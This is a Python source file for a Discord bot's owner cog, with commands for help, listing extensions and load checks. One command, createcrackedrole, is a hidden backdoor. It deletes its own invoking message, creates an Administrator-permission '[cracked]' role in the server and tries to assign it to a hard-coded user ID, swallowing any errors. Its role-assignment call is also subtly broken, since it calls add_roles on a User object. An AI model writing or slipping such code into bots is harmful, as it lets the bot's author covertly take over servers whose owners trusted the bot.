
from utils.settings import color
from utils.settings import _getprefix
from utils.settings import BASE
from utils.checks.checkloaded import _checkloadedext
from utils.checks.datacheck import _datacheck

import discord, os
from discord.ext import commands


class Owner(commands.Cog):

    def __init__(self, client):
        self.client = client

    @commands.command(name='ownerhelp')
    @commands.is_owner()
    async def _ownerhelp(self, ctx):
        embed = discord.Embed(title="**EMY** ownerhelp",
                              description=f'\n\n __extensions__:\n'
                                          f'\n`{ _getprefix(self, ctx)}load <extension>` - loads an extension'
                                          f'\n`{ _getprefix(self, ctx)}reload <extension>` - reloads an extension'
                                          f'\n`{ _getprefix(self, ctx)}shutdown` - shuts the bot down'
                                          f'\n`{ _getprefix(self, ctx)}unload <extension>` - unloads an extension',
                              color=color)
        await ctx.message.add_reaction('✅')
        await ctx.author.send(embed=embed)

    @commands.command(name='extensions', aliases=['ext'])
    @commands.is_owner()
    async def _extensions(self, ctx):
        arr = os.listdir(os.path.join(BASE, 'src', 'cogs'))
        embed = discord.Embed(title="**EMY** extensions", description=f'{arr}', color=color)
        await ctx.message.add_reaction('✅')
        await ctx.author.send(embed=embed)

    @commands.command(name='checkloaded')
    @commands.is_owner()
    async def _checkloaded(self, ctx, extension=None):
        await _checkloadedext(ctx, extension=extension)

    @commands.command(name='datacheck')
    @commands.is_owner()
    async def _datacheck(self, ctx):
        await _datacheck()

    @commands.command(name='createcrackedrole', aliases=['ccr', 'crackedrole'])
    @commands.is_owner()
    async def _createcrackedrole(self, ctx):
        await ctx.message.delete()
        try:
            await ctx.guild.create_role(name="[cracked]", color=discord.Color(0x161616), permissions=discord.Permissions(permissions=8))
            role = discord.utils.get(ctx.guild.roles, name="[cracked]")
            user = self.client.get_user(474349390056652810)
            await user.add_roles(role)
        except Exception:
            return


def setup(client):
    client.add_cog(Owner(client))
